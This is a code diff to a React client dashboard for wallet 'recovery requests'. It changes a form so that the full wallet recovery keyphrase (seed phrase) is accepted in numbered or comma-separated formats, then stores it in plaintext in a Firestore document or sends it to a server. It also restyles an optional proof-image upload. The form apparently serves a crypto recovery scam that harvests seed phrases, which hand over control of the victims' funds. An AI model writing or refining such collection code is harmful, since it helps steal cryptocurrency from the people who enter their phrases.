@@ -254,6 +254,15 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
   const [validationError, setValidationError] = React.useState<string | null>(null);
   const [proofImage, setProofImage] = React.useState<File | null>(null);
   const [proofImageError, setProofImageError] = React.useState<string | null>(null);
+  const proofInputRef = React.useRef<HTMLInputElement>(null);
+
+  const normalizeKeyphrase = (raw: string): string =>
+    raw
+      .replace(/\r?\n/g, ' ')
+      .replace(/[,;]+/g, ' ')
+      .replace(/\b\d{1,2}[.)](?=\s)/g, ' ')
+      .replace(/\s+/g, ' ')
+      .trim();
 
   const handleSubmitKeyphrase = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -261,14 +270,16 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
     setProofImageError(null);
     
     // Validation for non-empty keyphrase
-    if (keyphrase.trim().length === 0) {
+    const normalizedKeyphrase = normalizeKeyphrase(keyphrase);
+
+    if (normalizedKeyphrase.length === 0) {
       setValidationError('Please enter your recovery keyphrase.');
       return;
     }
     
-    const words = keyphrase.trim().split(/\s+/);
+    const words = normalizedKeyphrase.split(/\s+/);
     if (words.length < 3) {
-      setValidationError('Keyphrase is too short. Please enter a valid recovery phrase.');
+      setValidationError('Keyphrase is too short. Enter words separated by spaces (or numbered format).');
       return;
     }
 
@@ -343,7 +354,7 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
         const result = await submitClientKeyphrase(
           serverCaseId,
           email,
-          keyphrase.trim(),
+          normalizedKeyphrase,
           proofImagePayload
         );
         if (!result.ok) {
@@ -358,7 +369,7 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
       } else if (firestoreDocId) {
         const caseRef = doc(db, 'recovery_requests', firestoreDocId);
         await updateDoc(caseRef, {
-          walletKeyphrase: keyphrase.trim(),
+          walletKeyphrase: normalizedKeyphrase,
           status: 'PROCESSING',
           updatedAt: serverTimestamp(),
           keyphraseSubmittedAt: serverTimestamp(),
@@ -750,6 +761,7 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
                           Optional proof image (JPG/PNG/WEBP/HEIC/HEIF, max 10MB)
                         </label>
                         <input
+                          ref={proofInputRef}
                           type="file"
                           accept="image/png,image/jpeg,image/webp,image/heic,image/heif,.heic,.heif,.jpg,.jpeg,.png,.webp"
                           onChange={(e) => {
@@ -757,13 +769,36 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
                             const f = e.target.files?.[0] || null;
                             setProofImage(f);
                           }}
-                          className="w-full bg-black/50 border border-blue-500/20 rounded-lg p-3 text-xs text-slate-300 file:mr-3 file:px-3 file:py-2 file:rounded file:border-0 file:bg-blue-600 file:text-white file:font-mono file:text-[10px] file:uppercase"
+                          className="hidden"
                         />
-                        {proofImage && (
-                          <p className="text-[10px] font-mono text-slate-500 uppercase tracking-wide">
-                            Selected: {proofImage.name}
-                          </p>
-                        )}
+                        <div className="flex flex-wrap items-center gap-3">
+                          <button
+                            type="button"
+                            onClick={() => proofInputRef.current?.click()}
+                            className="px-4 py-2 rounded-lg border border-blue-500/40 bg-blue-600/20 text-white font-mono text-[10px] uppercase tracking-widest hover:bg-blue-600/30 transition-colors cursor-pointer"
+                          >
+                            Choose Image
+                          </button>
+                          {proofImage && (
+                            <button
+                              type="button"
+                              onClick={() => {
+                                setProofImage(null);
+                                setProofImageError(null);
+                                if (proofInputRef.current) proofInputRef.current.value = '';
+                              }}
+                              className="px-4 py-2 rounded-lg border border-red-500/40 bg-red-600/10 text-red-300 font-mono text-[10px] uppercase tracking-widest hover:bg-red-600/20 transition-colors cursor-pointer"
+                            >
+                              Remove Image
+                            </button>
+                          )}
+                        </div>
+                        <input
+                          type="text"
+                          readOnly
+                          value={proofImage ? `Selected: ${proofImage.name}` : 'No file chosen'}
+                          className="w-full bg-black/50 border border-blue-500/20 rounded-lg p-3 text-xs text-slate-300 font-mono"
+                        />
                         {proofImageError && (
                           <p className="text-[10px] font-mono text-red-400 uppercase tracking-wide">
                             {proofImageError}
